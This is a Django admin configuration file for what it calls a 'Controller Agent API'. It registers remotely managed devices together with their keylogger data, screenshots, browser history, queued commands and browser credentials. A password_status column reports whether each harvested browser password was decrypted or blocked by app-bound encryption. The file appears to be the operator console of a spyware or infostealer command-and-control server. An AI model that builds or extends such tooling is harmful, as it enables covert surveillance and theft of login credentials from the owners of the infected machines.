"""
Django admin configuration for the Controller Agent API.
"""

from django.contrib import admin
from django.utils.html import format_html
from .models import (
    Device, DeviceConfig, FileMetadata, ScreenshotMeta, 
    KeylogData, Command, BrowserHistory, BrowserCredential
)


class DeviceConfigInline(admin.StackedInline):
    model = DeviceConfig
    can_delete = False
    verbose_name_plural = 'Configuration'


@admin.register(Device)
class DeviceAdmin(admin.ModelAdmin):
    list_display = ['hostname', 'hardware_id_short', 'is_active', 'last_seen', 'ip_address', 'agent_version']
    list_filter = ['is_active', 'registered_at']
    search_fields = ['hostname', 'hardware_id', 'ip_address']
    readonly_fields = ['id', 'token', 'registered_at', 'last_seen']
    inlines = [DeviceConfigInline]
    
    fieldsets = (
        (None, {
            'fields': ('id', 'hardware_id', 'hostname', 'is_active')
        }),
        ('Authentication', {
            'fields': ('token',),
            'classes': ('collapse',)
        }),
        ('System Info', {
            'fields': ('os_version', 'agent_version', 'ip_address')
        }),
        ('Timestamps', {
            'fields': ('registered_at', 'last_seen')
        }),
    )
    
    def hardware_id_short(self, obj):
        return f"{obj.hardware_id[:16]}..." if len(obj.hardware_id) > 16 else obj.hardware_id
    hardware_id_short.short_description = 'Hardware ID'
    
    actions = ['enable_devices', 'disable_devices', 'enable_kill_switch', 'disable_kill_switch']
    
    @admin.action(description='Enable selected devices')
    def enable_devices(self, request, queryset):
        queryset.update(is_active=True)
    
    @admin.action(description='Disable selected devices')
    def disable_devices(self, request, queryset):
        queryset.update(is_active=False)
    
    @admin.action(description='Enable kill switch for selected devices')
    def enable_kill_switch(self, request, queryset):
        for device in queryset:
            try:
                device.config.kill_switch = True
                device.config.save()
            except DeviceConfig.DoesNotExist:
                DeviceConfig.objects.create(device=device, kill_switch=True)
    
    @admin.action(description='Disable kill switch for selected devices')
    def disable_kill_switch(self, request, queryset):
        for device in queryset:
            try:
                device.config.kill_switch = False
                device.config.save()
            except DeviceConfig.DoesNotExist:
                pass


@admin.register(DeviceConfig)
class DeviceConfigAdmin(admin.ModelAdmin):
    list_display = ['device', 'kill_switch', 'screenshots_enabled', 'keylogger_enabled', 
                    'browser_triggers_enabled', 'updated_at']
    list_filter = ['kill_switch', 'screenshots_enabled', 'keylogger_enabled', 'browser_triggers_enabled']
    list_editable = ['kill_switch', 'screenshots_enabled', 'keylogger_enabled', 'browser_triggers_enabled']
    search_fields = ['device__hostname', 'device__hardware_id']


@admin.register(FileMetadata)
class FileMetadataAdmin(admin.ModelAdmin):
    list_display = ['file_type', 'device', 'original_filename', 'format', 'size_display', 'created_at']
    list_filter = ['file_type', 'resource_type', 'format', 'created_at']
    search_fields = ['public_id', 'original_filename', 'device__hostname']
    readonly_fields = ['id', 'created_at']
    
    def size_display(self, obj):
        if obj.size_bytes < 1024:
            return f"{obj.size_bytes} B"
        elif obj.size_bytes < 1024 * 1024:
            return f"{obj.size_bytes / 1024:.1f} KB"
        else:
            return f"{obj.size_bytes / (1024 * 1024):.1f} MB"
    size_display.short_description = 'Size'


@admin.register(ScreenshotMeta)
class ScreenshotMetaAdmin(admin.ModelAdmin):
    list_display = ['device', 'trigger_type', 'active_window_short', 'captured_at', 'thumbnail']
    list_filter = ['trigger_type', 'captured_at', 'device']
    search_fields = ['device__hostname', 'active_window_title', 'active_process']
    readonly_fields = ['id', 'received_at', 'preview_image']
    
    def active_window_short(self, obj):
        if len(obj.active_window_title) > 40:
            return f"{obj.active_window_title[:40]}..."
        return obj.active_window_title
    active_window_short.short_description = 'Active Window'
    
    def thumbnail(self, obj):
        return format_html('<a href="{}" target="_blank">View</a>', obj.secure_url)
    thumbnail.short_description = 'Image'
    
    def preview_image(self, obj):
        return format_html('<img src="{}" style="max-width: 600px; max-height: 400px;" />', obj.secure_url)
    preview_image.short_description = 'Preview'


@admin.register(KeylogData)
class KeylogDataAdmin(admin.ModelAdmin):
    list_display = ['device', 'start_time', 'end_time', 'character_count', 'window_switches', 'received_at']
    list_filter = ['device', 'received_at']
    search_fields = ['device__hostname', 'data']
    readonly_fields = ['id', 'received_at']
    
    fieldsets = (
        (None, {
            'fields': ('id', 'device')
        }),
        ('Timing', {
            'fields': ('start_time', 'end_time', 'received_at')
        }),
        ('Statistics', {
            'fields': ('character_count', 'window_switches')
        }),
        ('Data', {
            'fields': ('data',),
            'classes': ('wide',)
        }),
    )


@admin.register(Command)
class CommandAdmin(admin.ModelAdmin):
    list_display = ['command_type', 'device', 'status', 'created_at', 'delivered_at', 'completed_at']
    list_filter = ['command_type', 'status', 'created_at']
    search_fields = ['device__hostname', 'command_type']
    readonly_fields = ['id', 'created_at', 'delivered_at', 'completed_at']
    
    fieldsets = (
        (None, {
            'fields': ('id', 'device', 'command_type', 'status')
        }),
        ('Payload', {
            'fields': ('payload',)
        }),
        ('Timing', {
            'fields': ('created_at', 'delivered_at', 'completed_at', 'expires_at')
        }),
        ('Result', {
            'fields': ('result', 'error_message'),
            'classes': ('collapse',)
        }),
    )
    
    actions = ['send_screenshot_command', 'send_config_refresh']
    
@admin.register(BrowserHistory)
class BrowserHistoryAdmin(admin.ModelAdmin):
    list_display = ['device', 'url_short', 'visit_count', 'last_visit_time', 'browser_type']
    list_filter = ['browser_type', 'last_visit_time', 'device']
    search_fields = ['device__hostname', 'url', 'title']
    readonly_fields = ['id', 'received_at']
    
    def url_short(self, obj):
        return obj.url[:50] + '...' if len(obj.url) > 50 else obj.url
    url_short.short_description = 'URL'


# BrowserCookie admin removed


@admin.register(BrowserCredential)
class BrowserCredentialAdmin(admin.ModelAdmin):
    list_display = ['device', 'origin_url_short', 'username_value', 'password_status', 'received_at']
    list_filter = ['browser_type', 'received_at', 'device']
    search_fields = ['device__hostname', 'origin_url', 'username_value']
    readonly_fields = ['id', 'received_at']
    
    def origin_url_short(self, obj):
        return obj.origin_url[:50] + '...' if len(obj.origin_url) > 50 else obj.origin_url
    origin_url_short.short_description = 'Origin URL'
    
    def password_status(self, obj):
        if "[Decryption Error" in obj.password_value:
            return format_html('<span style="color: red;">Error</span>')
        if "[App-Bound" in obj.password_value:
            return format_html('<span style="color: orange;">App-Bound</span>')
        return format_html('<span style="color: green;">Decrypted</span>')
    password_status.short_description = 'Status'
